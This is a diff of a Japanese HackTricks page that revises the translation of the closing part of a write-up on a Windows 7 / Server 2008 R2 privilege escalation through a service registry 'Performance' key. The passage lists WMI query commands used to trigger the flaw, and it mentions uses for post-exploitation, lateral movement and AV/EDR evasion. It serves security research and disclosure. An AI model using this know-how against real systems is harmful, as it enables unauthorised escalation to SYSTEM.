+> **注記:** もし私が `NETWORK SERVICE` として任意のコード実行を得ていたら、数ヶ月前にJames Forshawがこのブログ投稿で示したトリックのおかげで `LOCAL SYSTEM` アカウントからトークンを得ることができただけだったでしょう: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).
 
-また、各WMIクラスを個別に試してみましたが、同じ結果が得られました。
+また、WMIクラスを個別に取得しようと試みたところ、全く同じ結果が観察されました。
+```
 ```
 Get-WmiObject Win32_Perf
 Get-WmiObject Win32_PerfRawData
@@ -318,24 +326,22 @@ Get-WmiObject Win32_PerfFormattedData
 ```
 ## 結論 <a href="#conclusion" id="conclusion"></a>
 
-なぜこの脆弱性が長い間見逃されていたのかはわかりません。一つの説明としては、他のツールはおそらくレジストリでの完全な書き込みアクセスを探していたのに対し、この場合は`AppendData/AddSubdirectory`だけで十分だったからかもしれません。「誤構成」自体については、レジストリキーが特定の目的でこのように設定されていたと思われますが、具体的なシナリオでは、ユーザーがサービスの構成を変更する権限を持つことは考えられません。
+この脆弱性がこれほど長い間見過ごされてきた理由はわかりません。一つの説明としては、他のツールはレジストリで完全な書き込みアクセスを探していたのに対し、このケースでは`AppendData/AddSubdirectory`が実際に十分だったということです。"誤設定"自体に関しては、レジストリキーが特定の目的のためにこのように設定されたと思われますが、ユーザーがサービスの設定を変更する権限を持つ具体的なシナリオは思い浮かびません。
 
-この特権昇格の脆弱性について公開することを決めた理由は2つあります。最初の理由は、数ヶ月前に`GetModfiableRegistryPath`関数を使用してPrivescCheckスクリプトを更新した日に、実際に公開したからです（最初は気づかなかった）。2つ目の理由は、その影響が低いことです。これにはローカルアクセスが必要であり、サポートが終了した古いバージョンのWindowsにのみ影響を与えます（拡張サポートを購入している場合を除く）。この時点で、Windows 7 / Server 2008 R2をまだ適切にネットワーク内で分離せずに使用している場合、システム特権を取得する攻撃者を防ぐことはおそらく最も心配すべきことではないでしょう。
+この脆弱性について公に書くことにした理由は二つあります。一つ目は、実際には気づかないうちに公開してしまったことです。それは数ヶ月前、私のPrivescCheckスクリプトを`GetModfiableRegistryPath`関数で更新した日のことでした。二つ目は、影響が低いことです。ローカルアクセスが必要で、サポートが終了した古いバージョンのWindows（拡張サポートを購入していない限り）にのみ影響します。この時点で、Windows 7 / Server 2008 R2を適切にネットワーク内で隔離せずに使用している場合、攻撃者がSYSTEM権限を取得することを防ぐことはおそらく最小の懸念事項でしょう。
 
-この特権昇格の脆弱性の逸話的な側面を除いて、この「Perfomance」レジストリ設定は、ポストエクスプロイト、横方向移動、AV/EDR回避に関して非常に興味深い機会を提供していると思います。すでにいくつかの具体的なシナリオを考えていますが、まだいずれもテストしていません。続く...。
+この特権昇格脆弱性の逸話的な側面を除いて、この「Perfomance」レジストリ設定は、横移動やAV/EDR回避のための後の悪用に非常に興味深い機会を開くと思います。私はすでにいくつかの特定のシナリオを考えていますが、まだどれもテストしていません。続くかもしれませんか？…
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-- **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**を**フォロー**してください**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。
 
 </details>
